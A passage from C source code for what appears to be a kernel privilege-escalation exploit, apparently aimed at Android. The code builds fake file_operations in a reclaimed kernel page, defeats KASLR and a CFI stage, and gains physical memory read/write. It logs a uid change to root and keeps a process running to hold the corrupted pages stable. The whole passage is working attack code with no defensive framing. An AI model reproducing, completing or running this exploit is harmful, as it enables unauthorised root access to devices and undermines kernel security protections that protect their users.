      pipe_prepare_child = -1;
    }
    return 2;
  }
  pr_info("app fops stage=trigger-enter base=%016zx\n", page_base);
#endif
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
  int fops_oracle_triggered =
      app_trigger_fops_oracle_slot(P0_ORACLE_GATE_SLOT);
  int fops_oracle_gate =
      fops_oracle_triggered ? verify_p0_pipe_oracle_gate() : 0;
  int fops_oracle_restored = 0;
  if (fops_oracle_gate != 0) {
    app_publish_p0_dirty();
    fops_oracle_restored =
        app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_SLOT);
  }
  pr_info("fops-oracle-diag triggered=%d gate=%d restored=%d "
          "page=%016zx object_min=%d delay=%d; stopping before misc_fops\n",
          fops_oracle_triggered, fops_oracle_gate, fops_oracle_restored,
          page_base, APP_FOPS_MIN_OBJECT_INDEX,
          APP_FOPS_PSELECT_DELAY_USEC);
  return 1;
#else
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  const int fops_fresh_page_attempts = 1;
#else
#ifdef APP_FOPS_FRESH_PAGE_ATTEMPTS
  const int fops_fresh_page_attempts = APP_FOPS_FRESH_PAGE_ATTEMPTS;
#else
  const int fops_fresh_page_attempts = 1;
#endif
#endif
  for (int attempt = 1; attempt <= fops_fresh_page_attempts; attempt++) {
    if (attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base) {
        pr_warning("app fops fresh page unavailable attempt=%d/%d\n",
                   attempt, fops_fresh_page_attempts);
        continue;
      }
    }
    int triggered = app_trigger_fops_slide_route();
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
            attempt, triggered);
#endif
    int verified = 0;
#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
    APP_FOPS_DEFER_ALIAS_READBACK
    int postwrite_result = 0;
    int probe_restored = 0;
    if (fops_data_alias_deferred) {
      postwrite_result = verify_p0_pipe_data_page(
          fops_data_alias_deferred_target, fake_fops);
      probe_restored =
          app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
      pr_info("fops postwrite direct read target=%016zx initial=%016llx "
              "want=%016zx result=%d probe_restored=%d triggered=%d\n",
              fops_data_alias_deferred_target,
              (unsigned long long)fops_data_alias_deferred_initial,
              fake_fops, postwrite_result, probe_restored, triggered);
#if defined(APP_FOPS_DURABLE_POSTWRITE_LOG) && \
    APP_FOPS_DURABLE_POSTWRITE_LOG
      /* Preserve the authoritative result even if RDB dies before
       * dlopen returns.  stdout may be a pipe (adb shell), where fsync
       * returns EINVAL: that is not a failure worth aborting for. */
      fflush(NULL);
      if (fsync(STDOUT_FILENO) != 0 && errno != EINVAL && errno != EBADF) {
        pr_warning("fsync stdout errno=%d\n", errno);
      }
#endif
      fops_data_alias_deferred = 0;
    }
    if (triggered && postwrite_result == 1 && probe_restored) {
      verified = try_cfi_stage();
    } else {
      cfi_last_step = 35;
      cfi_last_errno = 0;
    }
#else
    verified = triggered && try_cfi_stage();
#endif
    pr_info("app fops slide attempt=%d/%d triggered=%d verified=%d "
            "step=%d errno=%d\n",
            attempt, fops_fresh_page_attempts, triggered, verified,
            cfi_last_step, cfi_last_errno);
    if (verified || cfi_dirty_seen) {
      break;
    }
    pr_info("app fops clean miss; releasing reclaim state before fresh "
            "page attempt=%d/%d\n",
            attempt, fops_fresh_page_attempts);
  }
#else
  for (int attempt = 1; attempt <= 1; attempt++) {
    int triggered = app_trigger_fops_slide_route();
    pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
            attempt, triggered);
    int verified = triggered && try_cfi_stage();
    pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
            "step=%d errno=%d\n",
            attempt, triggered, verified, cfi_last_step, cfi_last_errno);
    if (verified || cfi_dirty_seen) {
      break;
    }
  }
#endif
#endif
#else
  run_main_route_threads();
#endif

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
  if (exploit_ok) {
    pid_t keeper = spawn_allocation_keeper();
    pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
               keeper);
  }
  return exploit_ok ? 0 : 1;
}
